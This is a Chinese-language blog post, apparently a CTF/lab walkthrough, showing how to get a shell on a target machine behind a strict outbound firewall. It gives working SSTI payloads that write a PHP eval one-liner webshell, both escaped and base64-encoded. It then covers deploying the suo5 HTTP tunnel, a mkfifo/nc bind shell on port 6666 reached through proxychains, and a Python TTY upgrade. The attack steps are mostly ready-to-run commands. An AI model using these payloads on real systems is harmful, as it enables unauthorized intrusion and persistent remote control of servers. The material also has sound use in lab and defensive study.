@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="利用suo5正向连接shell场景设定：拿到webshell或者RCE后，发现由于目标防火墙严格的出站策略，传统的反弹shell全部失效，这时候就可以利用suo5正向连接shell。 内网渗透之巅：利用 suo5 穿透防火墙实现正向 Bind Shell0x00 前言在渗透测试的内网实战中，我们经常会遇到这样一种极其恶劣的环境：通过漏洞拿到了命令执行权限，但目标防火墙配置了极为严苛的规则——禁止一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="我的第一篇github博客文章">
+<meta property="og:url" content="https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="利用suo5正向连接shell场景设定：拿到webshell或者RCE后，发现由于目标防火墙严格的出站策略，传统的反弹shell全部失效，这时候就可以利用suo5正向连接shell。 内网渗透之巅：利用 suo5 穿透防火墙实现正向 Bind Shell0x00 前言在渗透测试的内网实战中，我们经常会遇到这样一种极其恶劣的环境：通过漏洞拿到了命令执行权限，但目标防火墙配置了极为严苛的规则——禁止一">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://mooi-max.github.io/QQ_1773710904808.png">
+<meta property="og:image" content="https://mooi-max.github.io/image-20260317102250745.png">
+<meta property="og:image" content="https://mooi-max.github.io/image-20260317112451619.png">
+<meta property="article:published_time" content="2026-03-15T10:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-21T11:18:00.823Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mooi-max.github.io/QQ_1773710904808.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>我的第一篇github博客文章</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/03/15/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAPhantom_mooi/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&text=我的第一篇github博客文章"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&title=我的第一篇github博客文章"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&is_video=false&description=我的第一篇github博客文章"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=我的第一篇github博客文章&body=Check out this article: https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&title=我的第一篇github博客文章"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&title=我的第一篇github博客文章"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&title=我的第一篇github博客文章"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&title=我的第一篇github博客文章"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&name=我的第一篇github博客文章&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&t=我的第一篇github博客文章"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell"><span class="toc-number">1.</span> <span class="toc-text">利用suo5正向连接shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B7%85%EF%BC%9A%E5%88%A9%E7%94%A8-suo5-%E7%A9%BF%E9%80%8F%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%90%91-Bind-Shell"><span class="toc-number">1.1.</span> <span class="toc-text">内网渗透之巅：利用 suo5 穿透防火墙实现正向 Bind Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%A0%B8%E5%BF%83%E5%88%A9%E5%99%A8%EF%BC%9Asuo5"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x01 核心利器：suo5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%9E%84%E9%80%A0%E6%AD%A3%E5%90%91-Shell%EF%BC%9A%E7%BB%95%E8%BF%87-e-%E9%99%90%E5%88%B6"><span class="toc-number">1.1.3.</span> <span class="toc-text">0x02 构造正向 Shell：绕过 -e 限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E7%A9%BF%E9%80%8F%E5%9C%B0%E9%81%93%EF%BC%9AProxychains-%E7%9A%84%E9%99%8D%E7%BB%B4%E6%89%93%E5%87%BB"><span class="toc-number">1.1.4.</span> <span class="toc-text">0x03 穿透地道：Proxychains 的降维打击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E4%BA%A4%E4%BA%92%E5%8D%87%E7%BA%A7%EF%BC%9A%E4%BB%8E-Web-%E5%88%B0-TTY"><span class="toc-number">1.1.5.</span> <span class="toc-text">0x04 交互升级：从 Web 到 TTY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.6.</span> <span class="toc-text">0x05 总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.</span> <span class="toc-text">举例演示</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8C%E6%8B%BF%E5%88%B0webshell"><span class="toc-number">1.2.1.</span> <span class="toc-text">写入一句话木马，拿到webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">✅ 正确的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%AF%B9-%E8%BF%9B%E8%A1%8C%E8%BD%AC%E4%B9%89%EF%BC%88%E6%9C%80%E7%9B%B4%E6%8E%A5%EF%BC%89"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">方法一：对 $ 进行转义（最直接）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9ABase64-%E7%BC%96%E7%A0%81%E5%86%99%E5%85%A5%EF%BC%88%E6%9C%80%E7%A8%B3%E5%A6%A5%EF%BC%8C%E5%BC%BA%E7%83%88%E6%8E%A8%E8%8D%90%EF%BC%89-%F0%9F%8C%9F"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">方法二：Base64 编码写入（最稳妥，强烈推荐） 🌟</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">下载相关文件</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        我的第一篇github博客文章
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-03-15T10:00:00.000Z" class="dt-published" itemprop="datePublished">2026-03-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="利用suo5正向连接shell"><a href="#利用suo5正向连接shell" class="headerlink" title="利用suo5正向连接shell"></a>利用suo5正向连接shell</h1><p>场景设定：拿到webshell或者RCE后，发现由于目标防火墙严格的出站策略，传统的反弹shell全部失效，这时候就可以利用suo5正向连接shell。</p>
+<h2 id="内网渗透之巅：利用-suo5-穿透防火墙实现正向-Bind-Shell"><a href="#内网渗透之巅：利用-suo5-穿透防火墙实现正向-Bind-Shell" class="headerlink" title="内网渗透之巅：利用 suo5 穿透防火墙实现正向 Bind Shell"></a>内网渗透之巅：利用 suo5 穿透防火墙实现正向 Bind Shell</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>在渗透测试的内网实战中，我们经常会遇到这样一种极其恶劣的环境：通过漏洞拿到了命令执行权限，但目标防火墙配置了极为严苛的规则——<strong>禁止一切非 80 端口的出站流量</strong>。这意味着所有的反弹 Shell（Reverse Shell）都会在发出的瞬间被防火墙无情拦截。</p>
+<p>此时，我们需要改变思路：既然“出不去”，我们就“走进来”。本文将分享如何利用 <strong>suo5</strong> 建立 HTTP 高性能隧道，并配合 <strong>正向连接（Bind Shell）</strong> 彻底撕开内网缺口。</p>
+<h3 id="0x01-核心利器：suo5"><a href="#0x01-核心利器：suo5" class="headerlink" title="0x01 核心利器：suo5"></a>0x01 核心利器：suo5</h3><p><code>suo5</code> 是一款高性能的 HTTP 正向代理工具。相比于老牌工具，它最大的特点是支持 <strong>Full Duplex（全双工）</strong>，能够极大地提升代理速度和稳定性。</p>
+<p><strong>部署步骤：</strong></p>
+<ol>
+<li><p><strong>服务端：</strong> 将项目 <code>assets/php/index.php</code> 重命名为 <code>suo5.php</code>，利用现有的 WebShell 或 SSTI 漏洞上传至目标 Web 目录。</p>
+</li>
+<li><p><strong>客户端：</strong> 在本地 Kali 执行：</p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./suo5 -t http://10.27.220.29/suo5.php -l 1111</span><br></pre></td></tr></table></figure>
+
+<p>当看到 <code>handshake succeeded</code> 时，说明我们的 SOCKS5 地道已经挖通，入口就在本地的 <code>1111</code> 端口。</p>
+</li>
+</ol>
+<h3 id="0x02-构造正向-Shell：绕过-e-限制"><a href="#0x02-构造正向-Shell：绕过-e-限制" class="headerlink" title="0x02 构造正向 Shell：绕过 -e 限制"></a>0x02 构造正向 Shell：绕过 -e 限制</h3><p>有了地道，我们需要在靶机上开启一个“门”等我们去连。但现代 Linux 的 <code>nc</code> 通常不支持 <code>-e</code> 参数。这里我们采用 <strong>FIFO 有名管道</strong> 的奇技淫巧。</p>
+<p>我们在之前的 RCE 漏洞点输入以下 Payload：</p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -lvnp 6666 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
+<p><strong>逻辑剖析：</strong></p>
+<ul>
+<li>我们在靶机本地开启了 <code>6666</code> 端口。</li>
+<li>利用管道 <code>f</code>，将网络输入流导向 <code>/bin/sh</code>，再将执行结果导回网络输出。</li>
+<li>防火墙此时并不会拦截，因为 <code>6666</code> 端口的监听发生在内网本地。</li>
+</ul>
+<h3 id="0x03-穿透地道：Proxychains-的降维打击"><a href="#0x03-穿透地道：Proxychains-的降维打击" class="headerlink" title="0x03 穿透地道：Proxychains 的降维打击"></a>0x03 穿透地道：Proxychains 的降维打击</h3><p>现在，我们要让本地的 <code>nc</code> 连接“钻”进 <code>suo5</code> 的地道，去触碰靶机内部的 <code>6666</code> 端口。</p>
+<ol>
+<li><p><strong>配置 Proxychains：</strong> 修改 <code>/etc/proxychains4.conf</code>，添加 <code>socks5 127.0.0.1 1111</code>。</p>
+</li>
+<li><p><strong>发起连接：</strong></p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nc -v 10.27.220.29 6666</span><br></pre></td></tr></table></figure>
+
+<p>当屏幕出现 <code>OK</code> 且连接成功时，你输入的每一个字符都将通过 HTTP 隧道加密传输，绕过所有 DPI（深度包检测）防火墙。</p>
+</li>
+</ol>
+<h3 id="0x04-交互升级：从-Web-到-TTY"><a href="#0x04-交互升级：从-Web-到-TTY" class="headerlink" title="0x04 交互升级：从 Web 到 TTY"></a>0x04 交互升级：从 Web 到 TTY</h3><p>初次连入的 Shell 通常不支持 Tab 补全。我们通过 Python 进行 TTY 升级：</p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>配合 <code>stty raw -echo; fg</code>，我们便获得了一个完美的、稳定的、无视防火墙阻隔的交互式 Shell。</p>
+<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>在防御升级的今天，正向连接配合 HTTP 隧道依然是破局的利器。<code>suo5</code> 提供了稳定的物理链路，而正向 Shell 解决了出站拦截的问题。渗透的本质不在于工具的堆砌，而在于对流量流向的精准操控。</p>
+<h2 id="举例演示"><a href="#举例演示" class="headerlink" title="举例演示"></a>举例演示</h2><p>这里用群友靶机suo做演示</p>
+<p><img src="/QQ_1773710904808.png" alt="img"></p>
+<p>发现存在ssti漏洞</p>
+<h3 id="写入一句话木马，拿到webshell"><a href="#写入一句话木马，拿到webshell" class="headerlink" title="写入一句话木马，拿到webshell"></a>写入一句话木马，拿到webshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval(\$_POST[\&quot;hhh\&quot;]);?&gt;&#x27; &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&quot;echo &#x27;&lt;?php @eval(\$_POST[\&quot;hhh\&quot;]);?&gt;&#x27; &gt; shell.php&quot;]|map(&quot;system&quot;)|join&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<p><strong>❌ 为什么你那个 Payload 无法成功？</strong></p>
+<p>主要有以下两个原因：</p>
+<ol>
+<li><strong><code>$</code> 符号被 Shell 吞掉了</strong>： 在 Linux 命令行中，<code>$</code> 符号用来表示变量。当你执行 <code>echo &#39;&lt;?php ... $_POST[&quot;hhh&quot;] ... ?&gt;&#39;</code> 时，Shell 会尝试寻找一个名为 <code>$_POST</code> 的环境变量。因为这个变量不存在，Shell 会把它替换成<strong>空字符串</strong>。<ul>
+<li><strong>结果：</strong> 你写进去的文件内容变成了 <code>&lt;?php @eval([&quot;hhh&quot;]);?&gt;</code>，这根本不是合法的 PHP 代码。</li>
+</ul>
+</li>
+<li><strong>引号冲突</strong>： 你的命令里嵌套了多层引号：<code>&#123;&#123;["... ' ... "hhh" ... ' ..."]&#125;&#125;</code>。模板引擎在解析这一长串字符串时，很容易因为引号配对错误导致解析失败。</li>
+</ol>
+<hr>
+<h3 id="✅-正确的方法"><a href="#✅-正确的方法" class="headerlink" title="✅ 正确的方法"></a>✅ 正确的方法</h3><h4 id="方法一：对-进行转义（最直接）"><a href="#方法一：对-进行转义（最直接）" class="headerlink" title="方法一：对 $ 进行转义（最直接）"></a>方法一：对 <code>$</code> 进行转义（最直接）</h4><p>你需要在 <code>$</code> 前面加上反斜杠 <code>\</code>，告诉 Shell：“这是一个普通的美元符号，别把它当变量解析”。</p>
+<p><strong>正确的 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&quot;echo &#x27;&lt;?php @eval(\$_POST[\&quot;hhh\&quot;]);?&gt;&#x27; &gt; shell.php&quot;]|map(&quot;system&quot;)|join&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意：</strong> 我还对 <code>hhh</code> 的双引号加了转义 <code>\&quot;</code>，以确保它不会破坏外层的字符串结构。</p>
+</blockquote>
+<hr>
+<h4 id="方法二：Base64-编码写入（最稳妥，强烈推荐）-🌟"><a href="#方法二：Base64-编码写入（最稳妥，强烈推荐）-🌟" class="headerlink" title="方法二：Base64 编码写入（最稳妥，强烈推荐） 🌟"></a>方法二：Base64 编码写入（最稳妥，强烈推荐） 🌟</h4><p>这是渗透实战中最常用的方法。因为它把所有的特殊字符（<code>$</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>）都变成了普通的字母和数字，完全避开了引号和变量解析的烦恼。</p>
+<ol>
+<li><p><strong>先在本地 Kali 计算木马的 Base64 编码：</strong></p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_POST[&quot;hhh&quot;]);?&gt;&#x27; | base64</span><br><span class="line"># 得到：PD9waHAgQGV2YWwoJF9QT1NUWyJoaGgiXSk7Pz4K</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>利用 SSTI 写入：</strong></p>
+<p>Code snippet</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&quot;echo &#x27;PD9waHAgQGV2YWwoJF9QT1NUWyJoaGgiXSk7Pz4K&#x27; | base64 -d &gt; shell.php&quot;]|map(&quot;system&quot;)|join&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>原理：</strong> <code>echo</code> 出编码字符串，通过管道符 <code>|</code> 交给 <code>base64 -d</code> 解码，最后重定向 <code>&gt;</code> 写入文件。</li>
+</ul>
+</li>
+</ol>
+<p><img src="/image-20260317102250745.png" alt="image-20260317102250745"></p>
+<p>拿到webshell后尝试各种反弹shell的方法，发现都不行</p>
+<h2 id="下载相关文件"><a href="#下载相关文件" class="headerlink" title="下载相关文件"></a>下载相关文件</h2><p>一.首先在目标靶机上下载suo5.php文件</p>
+<p>查看能否使用wget，curl工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -h</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -h</span><br></pre></td></tr></table></figure>
+
+<p>方法1：直接下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/zema1/suo5/refs/heads/main/assets/php/suo5.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://raw.githubusercontent.com/zema1/suo5/refs/heads/main/assets/php/suo5.php -o suo5.php</span><br></pre></td></tr></table></figure>
+
+<p>方法2：先下载到本机上，再传到目标靶机上</p>
+<p>（1）连接蚁剑，直接把suo5.php文件拖进&#x2F;var&#x2F;www&#x2F;html目录里</p>
+<p>（2）kali上用python开启临时服务，再到靶机上下载</p>
+<p>kali上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/zema1/suo5/refs/heads/main/assets/php/suo5.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>由于这里非常严格的出站策略，所以只能用80端口</p>
+<p>靶机上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.185/suo5.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image-20260317112451619.png" alt="image-20260317112451619"></p>
+<p>kali上执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./suo5-linux-amd64 -t http://$ip/suo5.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>靶机上执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc -lvnp 6666 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>kali再开一个端口执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nc -v 192.168.1.186 6666</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://github.com/zema1/suo5/releases/download/v2.1.0/suo5-linux-amd64">https://github.com/zema1/suo5/releases/download/v2.1.0/suo5-linux-amd64</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./suo5-linux-amd64 -t http://$ip/suo5.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc -lvnp 6666 &gt;/tmp/f&quot;] | map(&quot;system&quot;) | join &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell"><span class="toc-number">1.</span> <span class="toc-text">利用suo5正向连接shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B7%85%EF%BC%9A%E5%88%A9%E7%94%A8-suo5-%E7%A9%BF%E9%80%8F%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%90%91-Bind-Shell"><span class="toc-number">1.1.</span> <span class="toc-text">内网渗透之巅：利用 suo5 穿透防火墙实现正向 Bind Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%A0%B8%E5%BF%83%E5%88%A9%E5%99%A8%EF%BC%9Asuo5"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x01 核心利器：suo5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%9E%84%E9%80%A0%E6%AD%A3%E5%90%91-Shell%EF%BC%9A%E7%BB%95%E8%BF%87-e-%E9%99%90%E5%88%B6"><span class="toc-number">1.1.3.</span> <span class="toc-text">0x02 构造正向 